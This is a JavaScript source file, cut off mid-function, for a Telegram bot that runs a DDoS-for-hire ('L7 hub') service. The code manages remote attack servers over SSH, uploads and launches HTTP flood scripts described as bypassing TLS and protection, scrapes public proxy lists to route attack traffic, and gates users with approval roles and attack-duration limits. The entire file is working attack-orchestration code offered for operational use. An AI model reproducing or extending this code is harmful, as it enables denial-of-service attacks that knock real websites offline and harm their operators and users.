/**
 * PRIV L7 Bot v8 — Advanced Server & User Management
 * 
 * Features:
 *  - Interactive Add Server / Manage Servers via UI
 *  - User limit management (Max Duration, Max Concurrent) via UI
 *  - Parallel concurrent attacks with unique batch tracking
 *  - Native colored inline buttons
 *  - Robust SSH error handling (Anti-Crash)
 *  - Simplified /attack command
 * 
 * Install: npm install node-telegram-bot-api@0.66.0 ssh2 axios
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn, exec } = require('child_process');

// FIX: Handle both CJS and ESM versions of node-telegram-bot-api
const TGModule = require('node-telegram-bot-api');
const TelegramBot = TGModule.default || TGModule;

const { Client } = require('ssh2');
const axios = require('axios');

/* ══════════════════════════ CONFIG ══════════════════════════ */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),
  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 15000,
  HEALTH_CACHE_TTL: 30000,
  ATTACK_TIMEOUT: 25000,
  DEFAULT_THREADS: 16,
  DEFAULT_RATE: 90,
};

if (!CONFIG.BOT_TOKEN) { console.error('BOT_TOKEN required.'); process.exit(1); }
if (CONFIG.ADMIN_IDS.length === 0) { console.error('ADMIN_ID required.'); process.exit(1); }

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');
const METHODS_FILE = path.join(CONFIG.DATA_DIR, 'methods.json');
const BLACKLIST_FILE = path.join(CONFIG.DATA_DIR, 'blacklist.json');
const AUDIT_FILE = path.join(CONFIG.DATA_DIR, 'audit.log');

for (const [f, init] of [
  [USERS_FILE, '{}'], [SERVERS_FILE, '[]'], [METHODS_FILE, '[]'], [BLACKLIST_FILE, '[]'],
]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, init + '\n');
}

const NODE_BUILTINS = new Set([
  'http','https','http2','net','tls','fs','path','crypto','cluster',
  'zlib','stream','events','child_process','url','os','util','dns',
  'buffer','assert','querystring','perf_hooks','worker_threads','vm',
  'string_decoder','readline','repl','tty','v8','process','timers',
  'dgram','dns/promises','fs/promises','path/posix','path/win32',
  'constants','module','punycode','sys','trace_events','wasi',
]);

/* ══════════════════════════ STATE ══════════════════════════ */

const sessions = new Map();
const batches = new Map(); 
const cooldowns = new Map();
const pendingInput = new Map();
const serverConns = new Map();
const healthCache = new Map();
const warmupInProgress = new Set();

/* ══════════════════════════ STORAGE & HELPERS ══════════════════════════ */

function readJSON(f, fb) { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } }
function writeJSON(f, d) {
  const tmp = f + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(d, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, f);
}
function audit(event, actor, details = {}) {
  try { fs.appendFileSync(AUDIT_FILE, JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n'); } catch {}
}

function loadUsers() { return readJSON(USERS_FILE, {}); }
function saveUsers(u) { writeJSON(USERS_FILE, u); }
function getUser(id) { return loadUsers()[String(id)] || null; }

function upsertUser(id, patch) {
  const users = loadUsers();
  const key = String(id);
  users[key] = { ...(users[key] || {}), ...patch, updatedAt: new Date().toISOString() };
  saveUsers(users);
  return users[key];
}

function isAdmin(id) { return CONFIG.ADMIN_IDS.includes(id); }

function ensureUserExists(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;

  if (isAdmin(id)) {
    return upsertUser(id, {
      telegramId: id, username: msg.from.username || null,
      firstName: msg.from.first_name || null, role: 'admin',
      createdAt: new Date().toISOString(),
      limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
    });
  }

  return upsertUser(id, {
    telegramId: id, username: msg.from.username || null,
    firstName: msg.from.first_name || null, role: 'pending',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
}

/* ══════════════════════════ BLACKLIST ══════════════════════════ */

function loadBlacklist() { return readJSON(BLACKLIST_FILE, []); }
function saveBlacklist(l) { writeJSON(BLACKLIST_FILE, l); }

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
}

function hostMatches(h, p) {
  h = normalizeHost(h); p = normalizeHost(p);
  if (!h || !p) return false;
  if (p.startsWith('*.')) { const b = p.slice(2); return h === b || h.endsWith('.' + b); }
  return h === p;
}

function isBlacklisted(host) { return loadBlacklist().some(p => hostMatches(host, p)); }

/* ══════════════════════════ METHODS ══════════════════════════ */

const BUILTIN_METHODS = [
  {
    id: 'priv', name: 'Privflood', file: 'priv.js', builtin: true,
    emoji: '🔴', desc: 'HTTP/1.1 + HTTP/2 Mixed Flood',
    example: '/attack priv <url> <dur>',
    parse: (a) => {
      const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE), ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('ddg')) b.push('-ddg');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'bypass', name: 'Bypass', file: 'bypass.js', builtin: true,
    emoji: '🟡', desc: 'Advanced HTTP/2 Bypass Flood',
    example: '/attack bypass <url> <dur>',
    parse: (a) => {
      let [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE), ...o] = a;
      if (target && /^(GET|POST)$/i.test(target) && a.length >= 4) {
        const m = target.toUpperCase();
        [target, duration, threads, rate] = [duration, a[1], a[2] || String(CONFIG.DEFAULT_THREADS), a[3] || String(CONFIG.DEFAULT_RATE)];
        a = [m, ...a.slice(4)];
      }
      const b = ['GET', target, duration, threads, rate, CONFIG.PROXY_FILE];
      o.forEach(x => {
        if (x.startsWith('query=')) b.push('--query', x.split('=')[1]);
        else if (x === 'limit') b.push('--limit', 'true');
        else if (x.startsWith('delay=')) b.push('--delay', x.split('=')[1]);
        else if (x === 'ios') b.push('--ios');
      });
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'crush', name: 'C-Rush', file: 'l.js', builtin: true,
    emoji: '🟢', desc: 'HTTP/1.1 & HTTP/2 Mixed RushAway',
    example: '/attack crush <url> <dur>',
    parse: (a) => {
      const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE), ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('cache')) b.push('-ch', 'true');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'tls', name: 'TLS-Bypass', file: 'tls.js', builtin: true,
    emoji: '🔵', desc: 'HTTP/2 TLS Fingerprint Bypass',
    example: '/attack tls <url> <dur>',
    parse: (a) => {
      const [target, duration, rate = String(CONFIG.DEFAULT_RATE), threads = String(CONFIG.DEFAULT_THREADS)] = a;
      return { target, duration, threads, rate, args: [target, duration, rate, threads, CONFIG.PROXY_FILE] };
    },
  },
];

function loadCustomMethods() { return readJSON(METHODS_FILE, []); }
function saveCustomMethods(l) { writeJSON(METHODS_FILE, l); }

function allMethods() {
  const custom = loadCustomMethods().map(m => ({
    id: m.id, name: m.name, file: m.file, builtin: false, emoji: '🔧',
    desc: 'Custom method',
    template: m.template, example: m.example || `/attack ${m.id} <url> <dur>`,
    parse: (a) => {
      const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE)] = a;
      let s = m.template;
      const vals = [target, duration, threads, rate];
      vals.forEach((v, i) => { s = s.split(`$${i + 1}`).join(v); });
      s = s.split('{proxy}').join(CONFIG.PROXY_FILE);
      return { target, duration, threads, rate, args: s.split(/\s+/).filter(Boolean) };
    },
  }));
  return [...BUILTIN_METHODS, ...custom];
}

function getMethod(id) { return allMethods().find(m => m.id === id); }
function availableMethods() {
  return allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
}

/* ══════════════════════════ SERVERS & SSH ══════════════════════════ */

function loadServers() { return readJSON(SERVERS_FILE, []); }
function saveServers(l) { writeJSON(SERVERS_FILE, l); }
function getServer(id) { return loadServers().find(s => s.id === id); }

function upsertServer(patch) {
  const list = loadServers();
  const idx = list.findIndex(s => s.id === patch.id);
  if (idx >= 0) list[idx] = { ...list[idx], ...patch };
  else list.push(patch);
  saveServers(list);
  return patch;
}

function removeServer(id) {
  const c = serverConns.get(id);
  if (c) { try { c.end(); } catch {} serverConns.delete(id); }
  healthCache.delete(id);
  saveServers(loadServers().filter(s => s.id !== id));
}

function newServerId() { return 'srv_' + crypto.randomBytes(3).toString('hex'); }

function serverStats() {
  const list = loadServers();
  const online = list.filter(s => s.status === 'online').length;
  const offline = list.length - online;
  const attacking = new Set(
    [...sessions.values()].filter(s => s.status === 'running' && s.where === 'remote').map(s => s.serverId)
  ).size;
  return { total: list.length, online, offline, attacking };
}

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    let isSettled = false;
    const timer = setTimeout(() => {
      if (isSettled) return;
      isSettled = true;
      try { conn.end(); } catch {}
      reject(new Error('SSH timeout'));
    }, CONFIG.SSH_TIMEOUT);

    conn.on('ready', () => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      resolve(conn);
    });
    conn.on('error', (e) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      try { conn.end(); } catch {}
      reject(e);
    });
    conn.on('error', () => {}); // Prevent crash

    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
      });
    } catch (e) {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      reject(e);
    }
  });
}

function sshExec(conn, cmd, timeoutMs = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); } }, timeoutMs);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(timer); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', (code) => { clearTimeout(timer); done = true; resolve({ code: code || 0, out, err: errOut }); });
      });
    } catch (e) { clearTimeout(timer); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

function sshUpload(conn, local, remote) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(local, remote, (e) => {
        try { sftp.end(); } catch {}
        if (e) reject(e); else resolve();
      });
    });
  });
}

async function getServerConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const server = getServer(id);
  if (!server) throw new Error('Server not found: ' + id);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

async function prewarmServers(serverIds) {
  const toWarm = serverIds.filter(id => !serverConns.has(id) && !warmupInProgress.has(id));
  if (toWarm.length === 0) return;
  toWarm.forEach(id => warmupInProgress.add(id));
  await Promise.allSettled(toWarm.map(async (id) => {
    try { await getServerConn(id); } catch (e) {}
    warmupInProgress.delete(id);
  }));
}

async function checkServerHealth(id, force = false) {
  const cached = healthCache.get(id);
  if (!force && cached && Date.now() - cached.at < CONFIG.HEALTH_CACHE_TTL) return cached;
  try {
    const conn = await getServerConn(id);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    const load = (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?';
    const result = { online, load, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: online ? 'online' : 'offline', lastCheck: Date.now() });
    return result;
  } catch (e) {
    const result = { online: false, load: '?', error: e.message, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: 'offline', lastCheck: Date.now() });
    return result;
  }
}

/* ══════════════════════════ ATTACK ENGINE ══════════════════════════ */

function newSessionId() { return 'sess_' + crypto.randomBytes(3).toString('hex'); }
function newBatchId() { return 'batch_' + crypto.randomBytes(4).toString('hex'); }

function userActiveSessions(id) {
  return [...sessions.values()].filter(s => s.owner === id && s.status === 'running').length;
}

function launchLocal(user, method, args, batchId) {
  const id = newSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) throw new Error(`File missing: ${method.file}`);

  const child = spawn(process.execPath, [methodPath, ...args], {
    cwd: CONFIG.SCRIPT_DIR, detached: true, stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });

  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'local', child, logs: '',
  };
  child.stdout.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.stderr.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.on('exit', () => { session.status = 'done'; setTimeout(() => sessions.delete(id), 30000); });

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

async function launchRemote(user, method, args, serverId, batchId) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);
  const conn = await getServerConn(serverId);
  const check = await sshExec(conn, `test -f ${CONFIG.REMOTE_DIR}/${method.file} && echo OK || echo MISSING`, 8000);
  if (!check.out.includes('OK')) {
    try {
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
      const local = path.join(CONFIG.SCRIPT_DIR, method.file);
      if (!fs.existsSync(local)) throw new Error(`local missing: ${method.file}`);
      await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${method.file}`);
    } catch (e) { throw new Error(`${server.name}: sync failed`); }
  }

  const id = newSessionId();
  const logFile = `/tmp/.atk_${id}.log`;
  const script = [
    `cd ${CONFIG.REMOTE_DIR} || exit 1`,
    `rm -f ${logFile}`,
    `nohup node ${method.file} ${args.join(' ')} < /dev/null > ${logFile} 2>&1 &`,
    `PID=$!`,
    `echo $PID`,
  ].join('\n');
  const b64 = Buffer.from(script).toString('base64');
  const cmd = `echo ${b64} | base64 -d | bash`;
  const r = await sshExec(conn, cmd, CONFIG.ATTACK_TIMEOUT);

  let remotePid = parseInt((r.out || '').trim().replace(/[^0-9]/g, ''), 10);
  if (!remotePid || isNaN(remotePid)) {
    const pg = await sshExec(conn, `pgrep -f "node ${method.file}" | head -1`, 8000);
    remotePid = parseInt((pg.out || '').trim().replace(/[^0-9]/g, ''), 10);
  }
  if (!remotePid || isNaN(remotePid)) {
    const tail = await sshExec(conn, `tail -3 ${logFile} 2>/dev/null || echo "no log"`, 6000);
    throw new Error(`${server.name}: ${(tail.out || '').trim().slice(0, 100) || 'launch failed'}`);
  }
  const alive = await sshExec(conn, `kill -0 ${remotePid} 2>/dev/null && echo ALIVE || echo DEAD`, 5000);
  if (!alive.out.includes('ALIVE')) throw new Error(`${server.name}: died immediately`);

  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logFile, logs: '',
  };
  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

function stopSession(id, reason = 'manual') {
  const s = sessions.get(id);
  if (!s || s.status !== 'running') return false;

  if (s.where === 'local' && s.child) {
    try { process.kill(-s.child.pid, 'SIGKILL'); } catch { try { s.child.kill('SIGKILL'); } catch {} }
  } else if (s.where === 'remote' && s.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(s.serverId);
        await sshExec(conn, `kill -9 ${s.remotePid} 2>/dev/null || true; pkill -9 -P ${s.remotePid} 2>/dev/null || true`, 8000);
      } catch {}
    })();
  }
  clearTimeout(s.timer);
  s.status = 'stopped';
  audit('attack_stopped', s.owner, { id, reason });

  if (s.batchId) {
    const batch = batches.get(s.batchId);
    if (batch) {
      batch.pending--;
      if (batch.pending <= 0) {
        batches.delete(s.batchId);
        bot.sendMessage(batch.chatId,
          `🏁 <b>Attack finished</b>\n\n` +
          `📦 Method: <b>${batch.methodName}</b>\n` +
          `🎯 Target: <code>${batch.target}</code>\n` +
          `⏱ Duration: ${batch.duration}s\n\n` +
          `<i>All nodes finished. Ready for next.</i>`,
          { parse_mode: 'HTML' }
        ).catch(() => {});
      }
    }
  }
  return true;
}

function stopAllSessions(ownerFilter = null) {
  let killed = 0;
  for (const [id, s] of sessions.entries()) {
    if (s.status !== 'running') continue;
    if (ownerFilter && s.owner !== ownerFilter) continue;
    if (stopSession(id, 'killall')) killed++;
  }
  return killed;
}

/* ══════════════════════════ VALIDATION & PROXY ══════════════════════════ */

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid'); }
  if (url.protocol !== 'https:') throw new Error('must be https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

function checkLimits(user, d, th, r) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(d) > l.maxDuration) throw new Error(`Max duration ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(th) > l.maxThreads) throw new Error(`Max threads ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(r) > l.maxRate) throw new Error(`Max rate ${l.maxRate}`);
}

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set();
  for (const src of PROXY_SOURCES) {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      r.data.toString().split(/\r?\n/).forEach(l => {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      });
    } catch {}
  }
  const list = [...seen];
  fs.writeFileSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE), list.join('\n'));
  return list.length;
}

/* ══════════════════════════ BOT CORE ══════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML', ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}

async function edit(chatId, messageId, text, opts = {}) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...opts }); }
  catch {}
}

async function answerCB(id, text, alert = false) {
  try { await bot.answerCallbackQuery(id, { text, show_alert: alert }); } catch {}
}

/* ══════════════════════════ COLORED BUTTON BUILDERS ══════════════════════════ */

function coloredBtn(text, callback_data, style) {
  return { text, callback_data, style };
}

/* ══════════════════════════ MENUS (WITH COLORS) ══════════════════════════ */

function mainMenu(userId) {
  const kb = [
    [
      coloredBtn('🚀 New Attack', 'menu_attack', 'primary'),
      coloredBtn('📊 Live Status', 'menu_status', 'success')
    ],
    [
      coloredBtn('📦 Methods', 'menu_methods', 'primary'),
      coloredBtn('📡 Servers', 'menu_servers', 'primary')
    ],
  ];
  if (isAdmin(userId)) {
    kb.push([coloredBtn('👑 Admin Panel', 'menu_admin', 'danger')]);
  }
  return { inline_keyboard: kb };
}

function attackMenu() {
  const methods = availableMethods();
  const kb = [];
  for (let i = 0; i < methods.length; i += 2) {
    const row = methods.slice(i, i + 2).map(m => ({
      text: `${m.emoji || '📦'} ${m.name}`,
      callback_data: `method_${m.id}`,
      style: m.id === 'tls' ? 'danger' : (m.id === 'crush' ? 'success' : 'primary'),
    }));
    kb.push(row);
  }
  kb.push([coloredBtn('⬅️ Back to Menu', 'menu_main', 'danger')]);
  return { inline_keyboard: kb };
}

function methodMenu(methodId) {
  return {
    inline_keyboard: [
      [coloredBtn('⚡ Quick Launch', `quick_${methodId}`, 'success')],
      [coloredBtn('⬅️ Back to Methods', 'menu_attack', 'primary')],
    ],
  };
}

function backMenu(label = '⬅️ Back', cb = 'menu_main') {
  return { inline_keyboard: [[coloredBtn(label, cb, 'primary')]] };
}

function adminMenu() {
  return {
    inline_keyboard: [
      [
        coloredBtn('👥 Manage Users', 'adm_users', 'primary'),
        coloredBtn('🖥 Manage Servers', 'adm_servers', 'primary')
      ],
      [
        coloredBtn('🚫 Blacklist', 'adm_blacklist', 'danger'),
        coloredBtn('📊 Stats', 'adm_stats', 'success')
      ],
      [
        coloredBtn('🔄 Refresh All', 'adm_refresh', 'primary'),
        coloredBtn('💀 Kill All', 'adm_killall', 'danger')
      ],
      [coloredBtn('⬅️ Back to Menu', 'menu_main', 'primary')],
    ],
  };
}

/* ══════════════════════════ MENU HANDLERS ══════════════════════════ */

async function showMainMenu(chatId, editMsgId) {
  const stats = serverStats();
  const user = getUser(chatId) || {};
  const txt = [
    `🔥 <b>PRIV L7 HUB</b> 🔥`,
    ``,
    `👤 Role: <b>${user.role || 'guest'}</b>`,
    `📡 Servers: <b>${stats.online}/${stats.total}</b> online · <b>${stats.attacking}</b> attacking`,
    ``,
    `<i>Use buttons below or type /attack for direct launch.</i>`,
  ].join('\n');

  if (editMsgId) {
    await edit(chatId, editMsgId, txt, { reply_markup: mainMenu(chatId) });
  } else {
    await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: mainMenu(chatId) });
  }
}

async function showAttackMenu(chatId, editMsgId) {
  const txt = [
    `🚀 <b>Choose Method</b>`,
    ``,
    `<i>Click a method to see its command format and launch options.</i>`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: attackMenu() });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: attackMenu() });
}

async function showMethodDetail(chatId, editMsgId, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b>`,
    ``,
    `📝 <i>${m.desc || 'Attack method'}</i>`,
    ``,
    `<b>Command:</b>`,
    `<code>${esc(m.example)}</code>`,
    ``,
    `<b>Defaults:</b>`,
    `• Threads: ${CONFIG.DEFAULT_THREADS}`,
    `• Rate: ${CONFIG.DEFAULT_RATE}`,
    ``,
    `<b>Example:</b>`,
    `<code>/attack ${m.id} https://example.com 60</code>`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: methodMenu(methodId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: methodMenu(methodId) });
}

async function showServers(chatId, editMsgId, userId) {
  const stats = serverStats();
  const list = loadServers();
  const txt = [
    `📡 <b>Servers</b>`,
    ``,
    `🟢 ${stats.online} online · 🔴 ${stats.offline} offline · ⚔️ ${stats.attacking} attacking`,
  ];

  if (isAdmin(userId)) {
    txt.push('');
    list.forEach(s => {
      const icon = s.status === 'online' ? '🟢' : s.status === 'offline' ? '🔴' : '⚪';
      const n = [...sessions.values()].filter(x => x.status === 'running' && x.serverId === s.id).length;
      txt.push(`${icon} <b>${esc(s.name)}</b>${n > 0 ? ` ⚔️×${n}` : ''}`);
      txt.push(`  <code>${esc(s.host)}:${s.port}</code>`);
    });
  }

  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showStatus(chatId, editMsgId, userId) {
  const mine = [...sessions.values()].filter(s => s.owner === userId && s.status === 'running');
  const stats = serverStats();
  const txt = [
    `📊 <b>Live Status</b>`,
    ``,
    `📡 ${stats.online}/${stats.total} online · ${stats.attacking} attacking`,
    ``,
  ];
  if (mine.length === 0) {
    txt.push('📭 <i>No active sessions.</i>');
  } else {
    mine.forEach(s => {
      const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
      txt.push(`<code>${s.id}</code> · ${s.methodName} · ${esc(s.target)}`);
      txt.push(`  ⏱ ${elapsed}s / ${s.duration}s`);
    });
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showMethods(chatId, editMsgId) {
  const list = allMethods();
  const txt = [`📦 <b>Attack Methods</b>`, ''];
  list.forEach(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    txt.push(`${m.emoji || '📦'} <b>${m.name}</b> ${ok ? '' : '❌'}`);
    txt.push(`  <code>${esc(m.example)}</code>`);
  });
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showAdminPanel(chatId, editMsgId) {
  const users = loadUsers();
  const total = Object.keys(users).length;
  const admins = Object.values(users).filter(u => u.role === 'admin').length;
  const pending = Object.values(users).filter(u => u.role === 'pending').length;
  const s = serverStats();

  const txt = [
    `👑 <b>Admin Panel</b>`,
    ``,
    `👥 Users: <b>${total}</b> (${admins} admin, ${pending} pending)`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online`,
    `⚔️ Active: ${[...sessions.values()].filter(x => x.status === 'running').length}`,
    ``,
    `<i>Use buttons below.</i>`,
  ].join('\n');

  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: adminMenu() });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: adminMenu() });
}

async function showAdminUsers(chatId, editMsgId) {
  const list = Object.values(loadUsers());
  const kb = [];
  list.forEach(u => {
    const icon = u.role === 'admin' ? '👑' : u.role === 'user' ? '✅' : u.role === 'banned' ? '🚫' : '⏳';
    const style = u.role === 'admin' ? 'danger' : (u.role === 'user' ? 'success' : 'primary');
    kb.push([{ text: `${icon} ${u.firstName || u.username || u.telegramId}`, callback_data: `usr_${u.telegramId}`, style }]);
  });
  kb.push([coloredBtn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `👥 <b>Users (${list.length})</b>\n\nClick a user to manage.`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showUserActions(chatId, editMsgId, targetId) {
  const u = getUser(targetId);
  if (!u) return;
  const l = u.limits || {};
  const kb = [
    [
      coloredBtn('✅ Approve', `approve_${targetId}`, 'success'),
      coloredBtn('🚫 Ban', `ban_${targetId}`, 'danger'),
    ],
    [
      coloredBtn(`⏱ Max Dur (${l.maxDuration || '∞'})`, `setdur_${targetId}`, 'primary'),
      coloredBtn(`⚔️ Max Conc (${l.maxConcurrent || '∞'})`, `setconc_${targetId}`, 'primary')
    ],
    [coloredBtn('❌ Delete', `del_${targetId}`, 'danger')],
    [coloredBtn('⬅️ Back', 'adm_users', 'primary')],
  ];
  const txt = [
    `👤 <b>${esc(u.firstName || u.username || targetId)}</b>`,
    `ID: <code>${targetId}</code>`,
    `Role: <b>${u.role}</b>`,
    ``,
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    ``,
    `<i>Click below to change limits.</i>`
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminServers(chatId, editMsgId) {
  const list = loadServers();
  const kb = [];
  list.forEach(s => {
    kb.push([{ text: `🖥 ${s.name} (${s.status})`, callback_data: `srv_${s.id}`, style: s.status === 'online' ? 'success' : 'danger' }]);
  });
  kb.push([coloredBtn('➕ Add New Server', 'addsrv_start', 'primary')]);
  kb.push([coloredBtn('⬅️ Back', 'menu_admin', 'primary')]);

